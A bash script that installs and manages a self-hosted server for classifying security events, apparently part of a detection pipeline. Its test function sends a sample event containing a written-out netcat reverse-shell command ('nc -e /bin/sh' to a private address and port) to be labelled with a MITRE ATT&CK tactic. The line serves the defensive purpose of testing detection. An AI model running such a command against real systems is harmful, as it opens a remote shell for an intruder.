#!/bin/bash
#
# Installs and runs the self-hosted Laya decision server used for attack
# classification. Laya speaks the Jev /v1/systemone protocol and is what the
# analysis service calls when LAYA_ADDRESS is set.
#
# Usage:
#   scripts/setup-laya.sh install   # create the venv and install laya[serve]
#   scripts/setup-laya.sh start     # run laya-serve in the background
#   scripts/setup-laya.sh stop      # stop a background server
#   scripts/setup-laya.sh status    # show whether the server answers
#   scripts/setup-laya.sh test      # send a real /v1/systemone request
#
# Environment:
#   LAYA_VENV       venv location            (default: .venv/laya)
#   LAYA_HOST       bind address             (default: 0.0.0.0)
#   LAYA_PORT       listen port              (default: 8000)
#   LAYA_DEVICE     torch device             (default: cpu)
#   LAYA_THREADS    torch intra-op threads   (default: physical cores)
#   LAYA_PRELOAD    build checkpoints at startup instead of on first request
#   LAYA_API_KEY    require Authorization: Bearer <key> on every request
#   LAYA_PIDFILE    pid file                 (default: /tmp/laya.pid)
#   LAYA_LOGFILE    server log               (default: /tmp/laya.log)

set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
VENV="${LAYA_VENV:-$REPO_ROOT/.venv/laya}"
PIDFILE="${LAYA_PIDFILE:-/tmp/laya.pid}"
LOGFILE="${LAYA_LOGFILE:-/tmp/laya.log}"
HOST="${LAYA_HOST:-0.0.0.0}"
PORT="${LAYA_PORT:-8000}"
DEVICE="${LAYA_DEVICE:-cpu}"
BASE_URL="http://localhost:$PORT"

log() { echo "[setup-laya] $*"; }
die() { echo "[setup-laya] error: $*" >&2; exit 1; }

require_python() {
    command -v python3 >/dev/null 2>&1 || die "python3 not found; Laya needs Python 3.10 or newer"
    local version
    version="$(python3 -c 'import sys; print("%d.%d" % sys.version_info[:2])')"
    if [ "${version%%.*}" -lt 3 ] || { [ "${version%%.*}" -eq 3 ] && [ "${version##*.}" -lt 10 ]; }; then
        die "python $version found; Laya needs Python 3.10 or newer"
    fi
    log "using python $version at $(command -v python3)"
}

install_laya() {
    require_python
    log "creating venv at $VENV"
    python3 -m venv "$VENV"
    log "installing laya[serve]"
    "$VENV/bin/pip" install --upgrade pip
    "$VENV/bin/pip" install "laya[serve]"
    log "installed: $("$VENV/bin/laya-serve" --help 2>&1 | head -n 1 || echo 'laya-serve')"
}

laya_env() {
    local threads="${LAYA_THREADS:-}"
    if [ -z "$threads" ]; then
        threads="$( (command -v nproc >/dev/null 2>&1 && nproc) || sysctl -n hw.ncpu 2>/dev/null || echo 4)"
    fi
    echo "LAYA_HOST=$HOST LAYA_PORT=$PORT LAYA_DEVICE=$DEVICE LAYA_THREADS=$threads"
}

start_laya() {
    [ -x "$VENV/bin/laya-serve" ] || die "laya-serve not found in $VENV; run '$0 install' first"

    if status_laya >/dev/null 2>&1; then
        log "laya already answering on $BASE_URL"
        return 0
    fi

    if [ -f "$PIDFILE" ] && kill -0 "$(cat "$PIDFILE")" 2>/dev/null; then
        die "stale server still running as pid $(cat "$PIDFILE")"
    fi

    local preload="${LAYA_PRELOAD:-}"
    log "starting laya-serve on $HOST:$PORT (device=$DEVICE, preload=${preload:-off})"
    log "logging to $LOGFILE"

    (
        cd "$VENV"
        # shellcheck disable=SC2046
        env $(laya_env) LAYA_PRELOAD="$preload" LAYA_API_KEY="${LAYA_API_KEY:-}" \
            nohup ./bin/laya-serve >"$LOGFILE" 2>&1 &
        echo $! >"$PIDFILE"
    )

    for _ in $(seq 1 60); do
        if status_laya >/dev/null 2>&1; then
            log "laya is ready at $BASE_URL"
            return 0
        fi
        sleep 2
    done

    log "server did not become ready in 120s; last log lines:"
    tail -n 20 "$LOGFILE" >&2 || true
    die "laya failed to start"
}

stop_laya() {
    if [ ! -f "$PIDFILE" ]; then
        log "no pid file at $PIDFILE, nothing to stop"
        return 0
    fi

    local pid
    pid="$(cat "$PIDFILE")"
    if kill -0 "$pid" 2>/dev/null; then
        log "stopping laya pid $pid"
        kill "$pid"
        sleep 1
        kill -0 "$pid" 2>/dev/null && kill -9 "$pid" || true
    else
        log "pid $pid is not running"
    fi
    rm -f "$PIDFILE"
}

status_laya() {
    if curl -fsS --max-time 3 "$BASE_URL/health" >/dev/null 2>&1; then
        echo "laya is answering on $BASE_URL"
        return 0
    fi
    echo "laya is not answering on $BASE_URL" >&2
    return 1
}

test_laya() {
    curl -fsS --max-time 30 "$BASE_URL/v1/systemone" \
        -H 'content-type: application/json' \
        ${LAYA_API_KEY:+-H "Authorization: Bearer $LAYA_API_KEY"} \
        -d '{
          "state": {"event_type": "execve", "image": "/usr/bin/nc",
                    "command": "nc -e /bin/sh 10.0.0.5 4444"},
          "questions": {
            "tactic": {
              "type": "choice",
              "instructions": "Which MITRE ATT&CK tactic best describes this event?",
              "criteria": {
                "command-and-control": "outbound control of the host",
                "execution": "running code or a shell",
                "benign": "routine administration"
              }
            }
          }
        }'
    echo
}

case "${1:-install}" in
    install) install_laya ;;
    start)   start_laya ;;
    stop)    stop_laya ;;
    restart) stop_laya; start_laya ;;
    status)  status_laya ;;
    test)    test_laya ;;
    *)
        echo "usage: $0 {install|start|stop|restart|status|test}" >&2
        exit 2
        ;;
esac
